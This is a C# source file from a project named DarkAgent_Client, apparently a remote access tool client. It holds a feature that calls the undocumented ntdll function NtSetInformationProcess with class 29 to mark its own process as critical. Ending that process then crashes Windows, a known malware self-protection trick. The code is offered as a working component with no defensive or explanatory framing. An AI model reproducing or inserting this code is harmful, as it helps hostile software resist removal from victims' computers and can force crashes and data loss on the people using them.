using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Objects;
using DarkAgent_Client.src.Utils;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.ComponentModel;

namespace DarkAgent_Client.src.Features
{
    public class SystemProcess
    {
        public SystemProcess()
        {
            if (Settings.SystemProcess_Protect)
                SetCritical(true);
        }

        [DllImport("ntdll.dll", SetLastError = true)]
		extern static unsafe UInt32 NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, void* ProcessInformation, uint ProcessInformationLength);

        public unsafe static void SetCritical(bool enable)
		{
			Process.EnterDebugMode();
			uint ienable = enable ? 1u : 0u;
			try
			{
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, &ienable, sizeof(uint));
			}catch{}
			Process.LeaveDebugMode();
		}
    }
}